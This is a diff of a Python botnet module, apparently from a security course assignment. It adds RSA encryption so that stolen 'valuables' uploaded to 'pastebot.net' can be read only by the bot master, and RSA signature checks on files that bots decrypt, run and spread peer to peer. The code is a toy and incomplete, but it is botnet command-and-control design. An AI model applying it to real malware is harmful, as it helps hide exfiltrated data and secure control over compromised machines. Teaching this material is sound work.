@@ -1,20 +1,29 @@
 import os
+from Crypto.Hash import SHA256
+from Crypto.Signature import PKCS1_v1_5
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
 # Valuable data to be sent to the botmaster
 valuables = []
-
-###
+# The length of the signature
+SIGN_LEN = 128 
 
 def save_valuable(data):
   valuables.append(data)
 
 def encrypt_for_master(data):
-  # TODO: Implement
   # Encrypt the file so it can only be read by the bot master
-  return data
+  # TODO: This current method will break when data that is larger than
+  #       the 'pubKey' size occurs.
+  key = RSA.importKey(open('pubKey.der', 'rb').read())
+  cipher = PKCS1_OAEP.new(key)
+  ciphertext = cipher.encrypt(data)
+  
+  return ciphertext
 
 def upload_valuables_to_pastebot(fn):
   # Encrypt the valuables so only the bot master can read them
@@ -29,21 +38,17 @@ def upload_valuables_to_pastebot(fn):
 
   print("Saved valuables to pastebot.net/%s for the botnet master" % fn)
 
-###
-
 def verify_file(f):
   # Verify the file was sent by the bot master
-  # TODO: For Part 2, you'll use public key crypto here
-  # Naive verification by ensuring the first line has the "passkey"
-  lines = f.split(bytes("\n", "ascii"), 1)
-  first_line = lines[0]
-  if first_line == bytes("Caesar", "ascii"):
-    return True
-  return False
-
+  signature = f[:SIGN_LEN]
+  key = RSA.importKey(open('pubKey.der', 'rb').read())
+  h = SHA256.new(f[SIGN_LEN:])
+  verifier = PKCS1_v1_5.new(key)
+  
+  return verifier.verify(h, signature)
+  
 def process_file(fn, f):
   if verify_file(f):
-    # TODO:
     # If it was, store it unmodified
     # (so it can be sent to other bots)
     # Decrypt and run the file
@@ -68,8 +73,6 @@ def p2p_download_file(sconn):
   f = sconn.recv()
   print("Receiving %s via P2P" % fn)
   process_file(fn, f)
-
-###
 
 def p2p_upload_file(sconn, fn):
   # Grab the file and upload it to the other bot
